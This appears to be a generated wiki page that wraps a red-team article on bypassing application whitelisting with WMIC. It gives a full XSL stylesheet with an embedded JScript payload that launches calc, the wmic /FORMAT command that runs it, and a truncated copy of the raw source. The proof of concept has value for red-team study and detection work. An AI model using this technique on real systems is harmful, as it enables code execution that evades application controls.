---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# Application Whitelisting Bypass with WMIC and XSL

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-code-execution-application-whitelisting-bypass-with-wmic-and-xsl` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/code-execution/application-whitelisting-bypass-with-wmic-and-xsl.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

Another application whitelist bypassing technique discovered by Casey @subTee, similar to squiblydoo:

## Preserved Body

````markdown
Another application whitelist bypassing technique discovered by Casey @subTee, similar to squiblydoo:
[t1117-regsvr32-aka-squiblydoo.md](t1117-regsvr32-aka-squiblydoo.md)
## Execution

Define the XSL file containing the jscript payload:
```csharp
<?xml version='1.0'?>
<stylesheet
xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"
xmlns:user="placeholder"
version="1.0">
<output method="text"/>
	<ms:script implements-prefix="user" language="JScript">
	<![CDATA[
	var r = new ActiveXObject("WScript.Shell").Run("calc");
	]]> </ms:script>
</stylesheet>
```
Invoke any wmic command now and specify /format pointing to the evil.xsl:
```csharp
wmic os get /FORMAT:"evil.xsl"
```
![](<../../_assets/Screenshot from 2019-04-10 22-05-24.png>)

## Observation

Calculator is spawned by svchost.exe:

![](<../../_assets/Screenshot from 2019-04-10 21-57-52.png>)

## References
````

## Source Verification

[source record](../../sources/redteamingtactics/application-whitelisting-bypass-with-wmic-and-xsl.md)

## Evidence Excerpt

````text
_asset_filenames:
- Screenshot from 2019-04-10 21-57-52.png
- Screenshot from 2019-04-10 22-05-24.png
_body: "# Application Whitelisting Bypass with WMIC and XSL\n\nAnother application whitelist bypassing technique discovered\
\ by Casey @subTee, similar to squiblydoo:\n\n{% content-ref url=\"t1117-regsvr32-aka-squiblydoo.md\" %}\n[t1117-regsvr32-aka-squiblydoo.md](t1117-regsvr32-aka-squiblydoo.md)\n\
{% endcontent-ref %}\n\n## Execution\n\nDefine the XSL file containing the jscript payload:\n\n{% code title=\"evil.xsl\"\
\ %}\n```csharp\n<?xml version='1.0'?>\n<stylesheet\nxmlns=\"http://www.w3.org/1999/XSL/Transform\" xmlns:ms=\"urn:schemas-microsoft-com:xslt\"\
\nxmlns:user=\"placeholder\"\nversion=\"1.0\">\n<output method=\"text\"/>\n\t<ms:script implements-prefix=\"user\" language=\"\
````
